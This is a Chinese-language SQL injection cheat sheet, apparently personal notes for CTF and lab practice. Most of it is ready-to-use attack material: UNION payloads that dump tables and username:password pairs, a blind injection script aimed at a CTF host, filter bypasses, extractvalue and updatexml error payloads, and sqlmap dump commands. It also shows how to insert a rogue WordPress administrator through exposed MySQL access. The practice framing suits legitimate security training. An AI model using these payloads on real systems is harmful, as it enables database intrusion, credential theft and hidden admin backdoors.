# SQL注入

* ### 注入尝试

```
http://newspaper.com/items.php?id=2 //正常回显
http://newspaper.com/items.php?id=2 and 1=2 //提示报错或者未搜索到
http://newspaper.com/items.php?id=2 and 1=1 //正常回显
```

则可以执行注入，注入点为?id=

输入框情况下，尝试闭合后报错、闭合后加`#`不报错则闭合形式合法，存在注入

* ### 开始注入

Payload构造：

```
id=2'; show database;#
id=-1' order by 1#   //利用order by 1/2/3/4 查询列数
id=-1' union select 1,2,3,4,...,n#   //联合注入查看返回值（n为order by已确定的列数）
id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#   //爆database里面的表
id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#    //爆users表里面的字段
id=-1' union select 1,2,group_concat(username,0x3a,password) from users#    //爆值，最后输出以username:password格式输出
```

```
Information_schema.tables //存储了数据库中所有的表信息
Information_schema.columns where table_name = ‘a’  //存储了数据库内部表a中所有的字段信息
```

如果出现illigal mix of 'UNION', 尝试使用hex获取16进制输出

* ### 盲注

盲注脚本（二分搜索）

```
import requests
import time

url = "http://5280dd8d-5fd7-4412-840b-9bdac6ddcb46.node3.buuoj.cn/index.php"
temp = {"id" : ""}
flag = ""
for i in range(1,1000):
    time.sleep(0.06)
    low = 32
    high =128
    mid = (low+high)//2
    while(low<high):
        temp["id"] = "1^" + "(ascii(substr((select(flag)from(flag)),%d,1))>%d)^1" %(i,mid)
        r = requests.post(url,data=temp)
        #print(low,high,mid,":")
        if "Hello" in r.text:
            low = mid+1
        else:
            high = mid
        mid =(low+high)//2
    if(mid ==32 or mid ==127):
        break
    flag +=chr(mid)
    print(flag)


print("flag=" ,flag)
```

* ### Bypass

有一些题目中不需要用单引号闭合直接进行执行

一些题目中需要单引号加括号应对\('id'\)语句

一些题目中需要进行双引号加括号 --&gt; \("id"\)

或者双写绕过

```
union select --> uniunionon selselectect
```

XPATH报错注入

```
username=44&password=1'^extractvalue(1,concat(0x7e,(select(database()))))%23 //爆库名
username=44&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables) where table_schema='security')))%23   //爆表名
username=44&password=1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_schema=database())and(table_name)like('H4rDsq1')))))%23   //爆字段名
username=44&password=1'^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))%23   //爆值
username=44&password=1%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23  //若有substr限制字符数就用这个
```

用UPDATEXML进行注入

```
id=-1' and updatexml(1,concat(0x7e,database(),0x7e),1)%23 //爆库名
id=-1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23  //爆表名
id=-1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)%23  //爆字段名
id=-1' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23
```

过滤select--&gt;采用handler进行注入

```
HANDLER tbl_name OPEN [ [AS] alias]

HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]

HANDLER tbl_name CLOSE
```

* ### SQLMAP

sqlmap语句

```
python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security(数据库名) --tables --batch -v 0    //爆表
python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users（表名） --columns --batch -v 0    //爆字段
python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users -C username,password（字段名） --dump --batch -v 0    //爆值
```

* ### CVE

* #### wordpress信息泄露

远程连接mysql数据库

```
mysql -h 靶机ip -P 8500 -u www-data
```

作为访客身份远程登录，www-data对wordpress库拥有select和insert权限

通过查看并向表wp\_users中插入新用户和密码完成用户定义

```
select id,user_login,user_pass from wp_users;   //查看wp_users内部信息
insert into wp_users (id,user_login,user_pass,user_status) value(2,'leon','e10adc3949ba59abbe56e057f20f883e',0);
//密码123456
insert into wp_usermeta value(22,2,'wp_capabilities','a:1:{s:13:"administrator";b:1;}');  //修改usermeta表内的用户权限
insert into wp_usermeta value(23,2,'wp_user_level','10');
```

* #### 推荐练习环境
* SQLi Labs

* DVWA



